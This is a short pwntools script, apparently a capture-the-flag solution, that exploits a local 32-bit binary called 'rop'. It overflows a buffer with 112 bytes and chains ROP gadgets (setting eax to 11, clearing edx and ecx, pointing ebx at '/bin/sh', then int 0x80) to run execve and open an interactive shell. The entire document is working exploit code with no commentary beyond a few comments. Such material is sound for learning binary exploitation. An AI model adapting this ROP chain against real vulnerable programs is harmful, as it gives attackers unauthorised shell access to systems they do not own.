from pwn import *
# execve("bin/sh", null, null)

sh = process("./rop")
eax_ret = 0x080bb196
edx_ecx_ebx = 0x0806eb90
# binsh = 0x080BE408
elf = ELF("./rop")
binsh = next(elf.search(b"/bin/sh"))
int80 = 0x08049421


payload = flat(b'a'*112, eax_ret, 0xb, edx_ecx_ebx, 0, 0, binsh, int80)
sh.sendline(payload)
sh.interactive()